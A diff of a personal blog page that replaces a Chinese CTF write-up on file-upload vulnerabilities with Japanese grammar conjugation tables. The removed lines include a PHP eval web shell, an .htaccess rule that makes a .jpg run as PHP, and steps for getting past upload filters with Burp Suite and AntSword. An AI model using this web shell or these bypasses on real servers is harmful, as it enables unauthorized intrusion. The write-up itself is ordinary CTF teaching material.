@@ -19,25 +19,25 @@
   <meta name="author" content="SakuraQ">
   <meta name="keywords" content="网络安全  Web  渗透">
   
-    <meta name="description" content="CTF-UpLoad文件上传漏洞总结1.0版本​	创建新的php文件，文件内容写入一句话木马：这里我的文件名用test.php 1&lt;?php eval($_POST[&#x27;ctf&#x27;]); ?&gt;  ​	修改文件后缀名为.jpg，绕过前端文件类型检测，上传。再用BurpSuite拦截发往服务器的请求，将请求内容中filename&#x3D;”test.jpg”改为filen">
+    <meta name="description" content="日本語の覚書形容詞変形   变形形式 分类 变形规则 原形例 变形后例    否定形 い形容词 い→くない 高い 高くない    な形容词 な→ではない&#x2F;ではありません 静かな 静かではない    名词 名词＋ではない&#x2F;ではありません 学生 学生ではない   过去形 い形容词 い→かった 高い 高かった    な形容词 な→だった&#x2F;でした 静かな 静かだった    名">
 <meta property="og:type" content="article">
-<meta property="og:title" content="UpLoad漏洞 WP">
-<meta property="og:url" content="http://yaesakuraq.github.io/2025/02/23/CTF-UpLoad%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:title" content="日本語の勉強">
+<meta property="og:url" content="http://yaesakuraq.github.io/2025/02/24/%E6%97%A5%E6%9C%AC%E8%AA%9E%E3%82%92%E5%8B%89%E5%BC%B7%E3%81%99%E3%82%8B/index.html">
 <meta property="og:site_name" content="SakuraQ&#39;s Blog">
-<meta property="og:description" content="CTF-UpLoad文件上传漏洞总结1.0版本​	创建新的php文件，文件内容写入一句话木马：这里我的文件名用test.php 1&lt;?php eval($_POST[&#x27;ctf&#x27;]); ?&gt;  ​	修改文件后缀名为.jpg，绕过前端文件类型检测，上传。再用BurpSuite拦截发往服务器的请求，将请求内容中filename&#x3D;”test.jpg”改为filen">
-<meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-02-23T15:16:40.000Z">
-<meta property="article:modified_time" content="2025-02-23T16:02:59.536Z">
+<meta property="og:description" content="日本語の覚書形容詞変形   变形形式 分类 变形规则 原形例 变形后例    否定形 い形容词 い→くない 高い 高くない    な形容词 な→ではない&#x2F;ではありません 静かな 静かではない    名词 名词＋ではない&#x2F;ではありません 学生 学生ではない   过去形 い形容词 い→かった 高い 高かった    な形容词 な→だった&#x2F;でした 静かな 静かだった    名">
+<meta property="og:locale">
+<meta property="article:published_time" content="2025-02-23T16:42:34.000Z">
+<meta property="article:modified_time" content="2025-02-24T15:21:25.225Z">
 <meta property="article:author" content="SakuraQ">
-<meta property="article:tag" content="CTF">
-<meta property="article:tag" content="Web">
+<meta property="article:tag" content="日本語">
+<meta property="article:tag" content="勉強します">
 <meta name="twitter:card" content="summary_large_image">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>UpLoad漏洞 WP - SakuraQ&#39;s Blog</title>
+  <title>日本語の勉強 - SakuraQ&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -203,7 +203,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="UpLoad漏洞 WP"></span>
+            <span id="subtitle" data-typed-text="日本語の勉強"></span>
           
         </div>
 
@@ -219,8 +219,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-02-23 23:16" pubdate>
-          2025-02-23 23:16:40
+        <time datetime="2025-02-24 00:42" pubdate>
+          2025-02-24 00:42:34
         </time>
       </span>
     
@@ -231,7 +231,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          279 字
+          658 字
         
       </span>
     
@@ -242,7 +242,7 @@
         
         
         
-          3 分钟
+          6 分钟
         
       </span>
     
@@ -288,24 +288,427 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">UpLoad漏洞 WP</h1>
+            <h1 id="seo-header">日本語の勉強</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="CTF-UpLoad"><a href="#CTF-UpLoad" class="headerlink" title="CTF-UpLoad"></a>CTF-UpLoad</h1><h2 id="文件上传漏洞总结"><a href="#文件上传漏洞总结" class="headerlink" title="文件上传漏洞总结"></a>文件上传漏洞总结</h2><h3 id="1-0版本"><a href="#1-0版本" class="headerlink" title="1.0版本"></a>1.0版本</h3><p>​	创建新的php文件，文件内容写入一句话木马：这里我的文件名用test.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<p>​	修改文件后缀名为.jpg，绕过前端文件类型检测，上传。再用BurpSuite拦截发往服务器的请求，将请求内容中filename&#x3D;”test.jpg”改为filename&#x3D;”test.php”，转发后即可上传。</p>
-<p>​	用中国蚁剑链接，填入url&#x2F;upload&#x2F;test.php，密码为ctf，即可入侵后台拿到flag。</p>
-<h3 id="2-0版本"><a href="#2-0版本" class="headerlink" title="2.0版本"></a>2.0版本</h3><p>​	2.0版本新增了后端php文件类型检测，因此需将文件后缀名改为.phptml后重复1.0版本即可。</p>
-<h3 id="3-0版本"><a href="#3-0版本" class="headerlink" title="3.0版本"></a>3.0版本</h3><pre><code class="hljs"> 3.0版本新增后端php、phptml等等可用于php语言解析的文件后缀名检测，因此，需使用用于Apache Web服务器配置相关指令的.htaccess文件进行绕过。.htaccess文件中写入:
-</code></pre>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs htaccess">&lt;FilesMatch &quot;test.jpg&quot;&gt;<br>SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure>
-
-<p>可以在服务器端自动将test.jpg文件按照php文件来解析，达到绕过目的，最终拿到Flag。</p>
-<p>​	</p>
-<p>​	</p>
+                <h1 id="日本語の覚書"><a href="#日本語の覚書" class="headerlink" title="日本語の覚書"></a>日本語の覚書</h1><h2 id="形容詞変形"><a href="#形容詞変形" class="headerlink" title="形容詞変形"></a>形容詞変形</h2><table>
+<thead>
+<tr>
+<th>变形形式</th>
+<th>分类</th>
+<th>变形规则</th>
+<th>原形例</th>
+<th>变形后例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>否定形</strong></td>
+<td>い形容词</td>
+<td>い→くない</td>
+<td>高い</td>
+<td>高くない</td>
+</tr>
+<tr>
+<td></td>
+<td>な形容词</td>
+<td>な→ではない&#x2F;ではありません</td>
+<td>静かな</td>
+<td>静かではない</td>
+</tr>
+<tr>
+<td></td>
+<td>名词</td>
+<td>名词＋ではない&#x2F;ではありません</td>
+<td>学生</td>
+<td>学生ではない</td>
+</tr>
+<tr>
+<td><strong>过去形</strong></td>
+<td>い形容词</td>
+<td>い→かった</td>
+<td>高い</td>
+<td>高かった</td>
+</tr>
+<tr>
+<td></td>
+<td>な形容词</td>
+<td>な→だった&#x2F;でした</td>
+<td>静かな</td>
+<td>静かだった</td>
+</tr>
+<tr>
+<td></td>
+<td>名词</td>
+<td>名词＋だった&#x2F;でした</td>
+<td>学生</td>
+<td>学生だった</td>
+</tr>
+<tr>
+<td><strong>て形</strong></td>
+<td>い形容词</td>
+<td>い→くて</td>
+<td>高い</td>
+<td>高くて</td>
+</tr>
+<tr>
+<td></td>
+<td>な形容词</td>
+<td>な→で</td>
+<td>静かな</td>
+<td>静かで</td>
+</tr>
+<tr>
+<td><strong>副词形</strong></td>
+<td>い形容词</td>
+<td>い→く</td>
+<td>早い</td>
+<td>早く</td>
+</tr>
+<tr>
+<td></td>
+<td>な形容词</td>
+<td>な→に</td>
+<td>静かな</td>
+<td>静かに</td>
+</tr>
+<tr>
+<td><strong>假定形</strong></td>
+<td>い形容词</td>
+<td>い→ければ</td>
+<td>高い</td>
+<td>高ければ</td>
+</tr>
+<tr>
+<td></td>
+<td>な形容词</td>
+<td>な→なら（ば）</td>
+<td>静かな</td>
+<td>静かなら（ば）</td>
+</tr>
+<tr>
+<td></td>
+<td>名词</td>
+<td>名词＋なら（ば）</td>
+<td>学生</td>
+<td>学生なら（ば）</td>
+</tr>
+<tr>
+<td><strong>礼貌形</strong></td>
+<td>い形容词</td>
+<td>直接加です</td>
+<td>高い</td>
+<td>高いです</td>
+</tr>
+<tr>
+<td></td>
+<td>な形容词</td>
+<td>な→です</td>
+<td>静かな</td>
+<td>静かです</td>
+</tr>
+<tr>
+<td></td>
+<td>名词</td>
+<td>名词＋です</td>
+<td>学生</td>
+<td>学生です</td>
+</tr>
+<tr>
+<td><strong>过去否定</strong></td>
+<td>い形容词</td>
+<td>い→くなかった</td>
+<td>高い</td>
+<td>高くなかった</td>
+</tr>
+<tr>
+<td></td>
+<td>な形容词</td>
+<td>な→ではなかった</td>
+<td>静かな</td>
+<td>静かではなかった</td>
+</tr>
+<tr>
+<td></td>
+<td>名词</td>
+<td>名词＋ではなかった</td>
+<td>学生</td>
+<td>学生ではなかった</td>
+</tr>
+</tbody></table>
+<p><strong>特殊注意</strong>：</p>
+<ol>
+<li><p><strong>いい的变形</strong>：  </p>
+<ul>
+<li>いい → よくない（否定形）  </li>
+<li>いい → よかった（过去形）  </li>
+<li>いい → よければ（假定形）</li>
+</ul>
+</li>
+<li><p><strong>礼貌形变形组合</strong>：  </p>
+<ul>
+<li>高いです → 高くないです／高くありません（否定）  </li>
+<li>静かです → 静かではありません／静かじゃないです（否定）  </li>
+<li>学生です → 学生ではありません／学生じゃないです（否定）</li>
+</ul>
+</li>
+<li><p><strong>口语简略形</strong>：  </p>
+<ul>
+<li>ではない → じゃない  </li>
+<li>ではありません → じゃありません</li>
+</ul>
+</li>
+</ol>
+<h2 id="動詞変形（辞書形基准）"><a href="#動詞変形（辞書形基准）" class="headerlink" title="動詞変形（辞書形基准）"></a>動詞変形（辞書形基准）</h2><table>
+<thead>
+<tr>
+<th>变形形式</th>
+<th>动词分类</th>
+<th>变形规则</th>
+<th>辞書形例</th>
+<th>变形后例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>て形</strong></td>
+<td>一类动词</td>
+<td>根据词尾假名变化：<br>う&#x2F;つ&#x2F;る→って<br>む&#x2F;ぶ&#x2F;ぬ→んで<br>く→いて<br>ぐ→いで<br>す→して<br>例外：行く→行って</td>
+<td>書く</td>
+<td>書いて</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>急ぐ</td>
+<td>急いで</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>話す</td>
+<td>話して</td>
+</tr>
+<tr>
+<td></td>
+<td>二类动词</td>
+<td>る→て</td>
+<td>食べる</td>
+<td>食べて</td>
+</tr>
+<tr>
+<td></td>
+<td>三类动词</td>
+<td>する→して<br>来る→来て（きて）</td>
+<td>勉強する</td>
+<td>勉強して</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>来る</td>
+<td>来て</td>
+</tr>
+<tr>
+<td><strong>た形</strong></td>
+<td>一类动词</td>
+<td>与て形规则相同</td>
+<td>買う</td>
+<td>買った</td>
+</tr>
+<tr>
+<td></td>
+<td>二类动词</td>
+<td>る→た</td>
+<td>見る</td>
+<td>見た</td>
+</tr>
+<tr>
+<td></td>
+<td>三类动词</td>
+<td>する→した<br>来る→来た（きた）</td>
+<td>旅行する</td>
+<td>旅行した</td>
+</tr>
+<tr>
+<td><strong>ない形</strong></td>
+<td>一类动词</td>
+<td>词尾う段→あ段＋ない</td>
+<td>書く</td>
+<td>書かない</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td>例外：ある→ない</td>
+<td>買う</td>
+<td>買わない</td>
+</tr>
+<tr>
+<td></td>
+<td>二类动词</td>
+<td>る→ない</td>
+<td>食べる</td>
+<td>食べない</td>
+</tr>
+<tr>
+<td></td>
+<td>三类动词</td>
+<td>する→しない<br>来る→来ない（こない）</td>
+<td>勉強する</td>
+<td>勉強しない</td>
+</tr>
+<tr>
+<td><strong>被动形</strong></td>
+<td>一类动词</td>
+<td>词尾う段→あ段＋れる</td>
+<td>書く</td>
+<td>書かれる</td>
+</tr>
+<tr>
+<td></td>
+<td>二类动词</td>
+<td>る→られる</td>
+<td>食べる</td>
+<td>食べられる</td>
+</tr>
+<tr>
+<td></td>
+<td>三类动词</td>
+<td>する→される<br>来る→来られる（こられる）</td>
+<td>勉強する</td>
+<td>勉強される</td>
+</tr>
+<tr>
+<td><strong>使役形</strong></td>
+<td>一类动词</td>
+<td>词尾う段→あ段＋せる</td>
+<td>書く</td>
+<td>書かせる</td>
+</tr>
+<tr>
+<td></td>
+<td>二类动词</td>
+<td>る→させる</td>
+<td>食べる</td>
+<td>食べさせる</td>
+</tr>
+<tr>
+<td></td>
+<td>三类动词</td>
+<td>する→させる<br>来る→来させる（こさせる）</td>
+<td>勉強する</td>
+<td>勉強させる</td>
+</tr>
+<tr>
+<td><strong>可能形</strong></td>
+<td>一类动词</td>
+<td>词尾う段→え段＋る</td>
+<td>書く</td>
+<td>書ける</td>
+</tr>
+<tr>
+<td></td>
+<td>二类动词</td>
+<td>る→られる</td>
+<td>食べる</td>
+<td>食べられる</td>
+</tr>
+<tr>
+<td></td>
+<td>三类动词</td>
+<td>する→できる<br>来る→来られる（こられる）</td>
+<td>勉強する</td>
+<td>勉強できる</td>
+</tr>
+<tr>
+<td><strong>命令形</strong></td>
+<td>一类动词</td>
+<td>词尾う段→え段</td>
+<td>書く</td>
+<td>書け</td>
+</tr>
+<tr>
+<td></td>
+<td>二类动词</td>
+<td>る→ろ</td>
+<td>食べる</td>
+<td>食べろ</td>
+</tr>
+<tr>
+<td></td>
+<td>三类动词</td>
+<td>する→しろ<br>来る→来い（こい）</td>
+<td>勉強する</td>
+<td>勉強しろ</td>
+</tr>
+<tr>
+<td><strong>意向形</strong></td>
+<td>一类动词</td>
+<td>词尾う段→お段＋う</td>
+<td>書く</td>
+<td>書こう</td>
+</tr>
+<tr>
+<td></td>
+<td>二类动词</td>
+<td>る→よう</td>
+<td>食べる</td>
+<td>食べよう</td>
+</tr>
+<tr>
+<td></td>
+<td>三类动词</td>
+<td>する→しよう<br>来る→来よう（こよう）</td>
+<td>勉強する</td>
+<td>勉強しよう</td>
+</tr>
+<tr>
+<td><strong>假定形</strong></td>
+<td>一类动词</td>
+<td>词尾う段→え段＋ば</td>
+<td>書く</td>
+<td>書けば</td>
+</tr>
+<tr>
+<td></td>
+<td>二类动词</td>
+<td>る→れば</td>
+<td>食べる</td>
+<td>食べれば</td>
+</tr>
+<tr>
+<td></td>
+<td>三类动词</td>
+<td>する→すれば<br>来る→来れば（くれば）</td>
+<td>勉強する</td>
+<td>勉強すれば</td>
+</tr>
+<tr>
+<td><strong>禁止形</strong></td>
+<td>全分类</td>
+<td>辞書形＋な</td>
+<td>書く</td>
+<td>書くな</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>食べる</td>
+<td>食べるな</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td>勉強する</td>
+<td>勉強するな</td>
+</tr>
+</tbody></table>
 
                 
               </div>
@@ -324,22 +727,8 @@
     
       <span class="category-chain">
         
-  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  <a href="/categories/%E6%97%A5%E6%9C%AC%E8%AA%9E/" class="category-chain-item">日本語</a>
   
-  
-    <span>></span>
-    
-  <a href="/categories/CTF/Web/" class="category-chain-item">Web</a>
-  
-  
-    <span>></span>
-    
-  <a href="/categories/CTF/Web/UpLoad/" class="category-chain-item">UpLoad</a>
-  
-  
-
-  
-
   
 
       </span>
@@ -353,9 +742,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+        <a href="/tags/%E6%97%A5%E6%9C%AC%E8%AA%9E/" class="print-no-link">#日本語</a>
       
-        <a href="/tags/Web/" class="print-no-link">#Web</a>
+        <a href="/tags/%E5%8B%89%E5%BC%B7%E3%81%97%E3%81%BE%E3%81%99/" class="print-no-link">#勉強します</a>
       
     </div>
   
@@ -367,8 +756,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>UpLoad漏洞 WP</div>
-      <div>http://yaesakuraq.github.io/2025/02/23/CTF-UpLoad漏洞/</div>
+      <div>日本語の勉強</div>
+      <div>http://yaesakuraq.github.io/2025/02/24/日本語を勉強する/</div>
     </div>
     <div class="license-meta">
       
@@ -380,7 +769,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年2月23日</div>
+          <div>February 24, 2025</div>
         </div>
       
       
@@ -412,9 +801,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/02/24/%E6%97%A5%E6%9C%AC%E8%AA%9E%E3%82%92%E5%8B%89%E5%BC%B7%E3%81%99%E3%82%8B/" title="日本語の勉強">
+                      <a href="/2025/02/24/Sql%E6%B3%A8%E5%85%A5/" title="CTF-Sql注入">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">日本語の勉強</span>
+                        <span class="hidden-mobile">CTF-Sql注入</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -422,8 +811,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/02/11/HelloWorld/" title="HelloWorld">
-                        <span class="hidden-mobile">HelloWorld</span>
+                      <a href="/2025/02/23/CTF-UpLoad%E6%BC%8F%E6%B4%9E/" title="UpLoad漏洞 WP">
+                        <span class="hidden-mobile">UpLoad漏洞 WP</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
